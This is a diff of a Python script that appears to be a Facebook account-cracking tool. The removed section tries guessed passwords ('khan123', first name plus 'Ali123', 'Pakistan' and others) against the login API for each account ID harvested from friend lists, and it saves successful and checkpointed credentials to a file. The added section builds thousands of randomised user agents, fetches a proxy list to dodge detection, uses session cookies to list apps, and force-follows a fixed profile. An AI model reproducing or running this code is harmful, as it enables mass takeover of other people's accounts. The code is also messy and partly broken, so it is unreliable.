@@ -1,394 +1,697 @@
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-reload(sys)
-sys.setdefaultencoding('utf8')
- 
+		#created by Ali
+#tottaly written by Mr Ali
+#!/usr/bin/python3
+#---------------------[IMPORT]---------------------#
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
 
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+###----------[ IMPORT LIBRARY ]---------- ###
+import requests
+import bs4
+import sys
+import os
+import random
+import time
+import re
+import json
+import uuid
+import subprocess
+import marshal
+import rich
+import shutil
+import webbrowser
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup as par
+from datetime import date
+from datetime import datetime
+# from rich import print as printer
+from datetime import date
+import marshal
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures==2 > /dev/null')
+    os.system('python Pro07.py')
+from bs4 import BeautifulSoup
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '{RED}'
+H = '{GREEN}'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+GREEN ='\x1b[38;5;46m'
+RED = '\x1b[38;5;196m'
+WHITE = '\033[1;97m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+BLACK="\033[1;30m"
+R = '{RED}' # PUTIH
+G = '{GREEN}' # PUTIH
+Y = '\033[1;33m' # PUTIH
+Q = '\033[1;37m'
+T = '\033[1;34m'
+HBF = '{ HBF }'
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+import random
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+twf =[]
+user=[]
+ugen=[]
+for nt in range(10000):
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    rx=random.randrange(1, 999)
+    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    ugen.append(xx)
+
+loop = 0
+cp = []
+ok = []
+twf = []
+
+ugen = []
+for xd in range(5000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+try:
+    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+    open('.prox.txt','w').write(prox)
+except Exception as e:
+    print(' WELCOME TO RANDOM CLONING SYSTEM')
+    
+prox=open('.prox.txt','r').read().splitlines()
 
 
-def keluar():
-	print "\033[1;96m[!] \x1b[1;91mExit"
-	os.sys.exit()
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(00000.1)
-##### LOGO #####
-logo = Ali
-   Ali 
-   
-   THE ETHICAL HACK3R
-   N95hINg
-   All ROUNDER
-   pakistani BOY
-   SIN9p34
-\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mali
-\033[1;96mYouTube \033[1;93m: \033[1;92commingsoon
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/roxzombie/ali
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/roxzombie
-\033[1;91m======================================="""
-def tik():
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print logo
-		print("\r\033[1;96m \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-back = 0
-berhasil = []
-cekpoint = []
-oks = []
-id = []
-listgrup = []
-vulnot = "\033[31mNot Vuln"
-vuln = "\033[32mVuln"
-os.system("clear")
-print "\033[1;96m ========================================="
-print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mali
-\033[1;96mYouTube \033[1;93m: \033[1;92mcommingsoon
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/roxzombie/ali
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/roxzombie
-\033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
-CorrectUsername = "ali"
-CorrectPassword = "03038389842"
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username
-            loop = 'false'
-        else:
-            print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/roxzombie')
+for xd in range(10000):
+    a='Mozilla/5.0 (Symbian/3; Series60/'
+    b=random.randrange(1, 9)
+    c=random.randrange(1, 9)
+    d='Nokia'
+    e=random.randrange(100, 9999)
+    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+    g=random.randrange(1, 9)
+    h=random.randrange(1, 4)
+    i=random.randrange(1, 4)
+    j=random.randrange(1, 4)
+    k='Mobile Safari/535.1'
+    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+    ugen.append(uaku)
+
+
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+for x in range(10):
+    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+    b=random.randrange(100, 9999)
+    c=random.randrange(100, 9999)
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    h=random.randrange(1, 9)
+    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
+    j=random.randrange(1, 9)
+    k=random.randrange(1, 9)
+    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+def uaku():
+    try:
+        ua=open('bbnew.txt','r').read().splitlines()
+        for ub in ua:
+            ugen.append(ub)
+    except:
+        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
+        ua=open('.bbnew.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ua.write(un+'\n') 
+        ua=open('.bbnew.txt','r').read().splitlines()
+
+loop = 0
+cp = []
+ok = []
+twf = []
+
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+
+logo ="""  \033[1;92m _______  _______    _______  ______  _________
+  \033[1;97m(       )(  ____ )  (  ___  )(  __  \ \__   __/
+  \033[1;92m| () () || (    )|  | (   ) || (  \  )   ) (   
+  \033[1;97m| || || || (____| |   
+  \033[1;92m| |(_)| ||| |   | ALi_-_-_-_-_-
+  \033[1;97m| |   | || (\ (     | (   ) || |   _-_-_-_-_-_-_-Uswiii_-ki-_-_bxhiii:"_-:
+  \033[1;92m| )   ( || ) \ \__Sorry---___---_-Nimmi--_;-_Pagal
+  \033[1;97m|/     \||/   \__/  |/     \|(______/ \_______/
+\033[1;97m====================================================
+\033[1;97m[+]\033[1;91m    AUTHOR   \033[1;90m: \033[1;92Ali
+\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mMRroxzombie
+\033[1;97m[+]\033[1;91m    WHATSAPP \033[1;90m: \033[1;92m+923038389842
+\033[1;97m====================================================
+\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY MR Ali ]\x1b[00;1m\x1b[31;1m
+\033[1;97m===================================================="""
+clear()
+os.system("xdg-open https://www.facebook.com/roxzombie")
+xxxx = str(len(ugen))
+print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+print('\033[1;97m====================================================') 
+print("\033[1;97m[+]\033[1;92m TOTAL USER AGENTS \033[1;91m: \033[1;96m" + xxxx)
+print('\033[1;97m====================================================') 
+print (' \t           \033[1;37m[ \033[1;32mINTRODUCTION \033[1;37m]')
+print('\033[1;97m====================================================') 
+NameX =input('\033[1;97m[+]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \033[1;96m')
+#---------------------[LOOP MENU]---------------------#
+loop = 0
+cp = []
+ok = []
+twf = []
+#---------------------[APPLICATION CHECKER]---------------------#
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
     else:
-        print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/roxzombie')
-def login():
-	os.system('clear')
-	try:
-		toket = open('login.txt','r')
-		menu() 
-	except (KeyError,IOError):
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		print('\033[1;96m\x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m' )
-		id = raw_input('\033[1;96m \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
-		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\033[1;96m \x1b[1;91mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m \x1b[1;91mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\033[1;96m \x1b[1;91mIt seems that your account has a checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\033[1;96m \x1b[1;91mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
-def menu():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		print"\033[1;96m \x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		id = a['id']
-	except KeyError:
-		os.system('clear')
-		print"\033[1;96m \033[1;91mIt seems that your account has a checkpoint"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	except requests.exceptions.ConnectionError:
-		print"\033[1;96m \x1b[1;91mThere is no internet connection"
-		keluar()
-	os.system("clear")
-	print logo
-	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
-	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
-	pilih()
-def pilih():
-	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
-	if unikers =="":
-		print "\033[1;96m \x1b[1;91mFill in correctly"
-		pilih()
-	elif unikers =="1":
-		super()
-	elif unikers =="0":
-		jalan('Token Removed')
-		os.system('rm -rf login.txt')
-		keluar()
-	else:
-		print "\033[1;96m \x1b[1;91mFill in correctly"
-		pilih()
-def super():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;96m \x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')
-	print logo
-	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
-	pilih_super()
-def pilih_super():
-	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
-	if peak =="":
-		print "\033[1;96m \x1b[1;91mFill in correctly"
-		pilih_super()
-	elif peak =="1":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		jalan('\033[1;96m \033[1;93mGetting ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif peak =="2":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m \033[1;93mEnter ID \033[1;91m: \033[1;97m")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
-		except KeyError:
-			print"\033[1;96m \x1b[1;91mID Not Found!"
-			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-			super()
-		jalan('\033[1;96m \033[1;93mGetting IDs \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
-	elif peak =="3":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		try:
-			idlist = raw_input('\x1b[1;96m \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
-			for line in open(idlist,'r').readlines():
-				id.append(line.strip())
-		except IOError:
-			print '\x1b[1;96m \x1b[1;91mFile Not Found'
-			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
-			super()
-	elif peak =="0":
-		menu()
-	else:
-		print "\033[1;96m \x1b[1;91mFill in correctly"
-		pilih_super()
-	
-	print "\033[1;96m \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m \033[1;93mStarting \033[1;97m...')
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print
-	print('\x1b[1;96m \x1b[1;93mTo Stop Process Press CTRL Then Press z')
-	print 42*"\033[1;96m="
-	
-			
-	def main(arg):
-		global cekpoint,oks
-		user = arg
-		try:
-			os.mkdir('out')
-		except OSError:
-			pass
-		try:
-			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-			b = json.loads(a.text)
-			pass1 = ('khan123')
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			q = json.load(data)
-			if 'access_token' in q:
-				print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
-				oks.append(user+pass1)
-			else:
-				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m |\x1b[1;97m ' + pass1
-					cek = open("out/checkpoint.txt", "a")
-					cek.write(user+"|"+pass1+"\n")
-					cek.close()
-					cekpoint.append(user+pass1)
-				else:
-					pass2 = b['first_name']+'Ali123'
-					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q = json.load(data)
-					if 'access_token' in q:
-						print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
-						oks.append(user+pass2)
-					else:
-						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
-							cek = open("out/checkpoint.txt", "a")
-							cek.write(user+"|"+pass2+"\n")
-							cek.close()
-							cekpoint.append(user+pass2)
-						else:
-							pass3 = b['first_name'] + '987654'
-							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-							q = json.load(data)
-							if 'access_token' in q:
-								print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
-								oks.append(user+pass3)
-							else:
-								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
-									cek = open("out/checkpoint.txt", "a")
-									cek.write(user+"|"+pass3+"\n")
-									cek.close()
-									cekpoint.append(user+pass3)
-								else:
-									pass4 = 'Pakistan'
-									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									q = json.load(data)
-									if 'access_token' in q:
-										print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
-										oks.append(user+pass4)
-									else:
-										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
-											cek = open("out/checkpoint.txt", "a")
-											cek.write(user+"|"+pass4+"\n")
-											cek.close()
-											cekpoint.append(user+pass4)
-										else:
-											pass5 = b['first_name'] + 'qwertyuiop'
-											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											q = json.load(data)
-											if 'access_token' in q:
-												print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
-												oks.append(user+pass5)
-											else:
-												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
-													cek = open("out/checkpoint.txt", "a")
-													cek.write(user+"|"+pass5+"\n")
-													cek.close()
-													cekpoint.append(user+pass5)
-												else:
-													pass6 = b['first_name'] + 'Hacker123'
-													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													q = json.load(data)
-													if 'access_token' in q:
-														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-														oks.append(user+pass6)
-													else:
-														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-															cek = open("out/checkpoint.txt", "a")
-															cek.write(user+"|"+pass6+"\n")
-															cek.close()
-															cekpoint.append(user+pass6)
-														else:
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-															b = json.loads(a.text)
-															pass7 = b['first_name'] + '456456'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															q = json.load(data)
-															if 'access_token' in q:
-																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																oks.append(user+pass7)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																	cek = open("out/checkpoint.txt", "a")
-																	cek.write(user+"|"+pass7+"\n")
-																	cek.close()
-																	cekpoint.append(user+pass7)
-																	
-															
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m \033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal OK\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
-	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-	menu()
+        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
+        for i in range(len(game)):
+            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+            #created by hbf team(owners) Ali & Mahad
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
+    else:
+        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
+        for i in range(len(game)):
+            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('\033[1;97m====================================================') 
+def follow(ses,coki):
+    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
+    get = r.find('a', string='Follow').get('href')
+    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+
+#---------------------[MAIN MENU]---------------------#
+def main():
+    clear()
+    os.getuid
+    os.system("clear");print(logo)
